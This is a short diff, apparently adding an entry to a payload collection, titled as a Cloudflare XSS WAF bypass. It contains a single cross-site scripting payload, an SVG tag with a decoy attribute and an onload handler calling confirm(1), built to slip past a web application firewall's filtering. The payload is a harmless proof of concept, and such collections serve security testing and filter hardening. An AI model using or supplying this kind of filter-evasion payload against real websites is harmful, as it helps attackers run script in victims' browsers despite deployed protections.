@@ -1,0 +1,3 @@
+Cloudflare XSS WAF Bypass 
+
+<svg onx=() onload=(confirm)(1)>
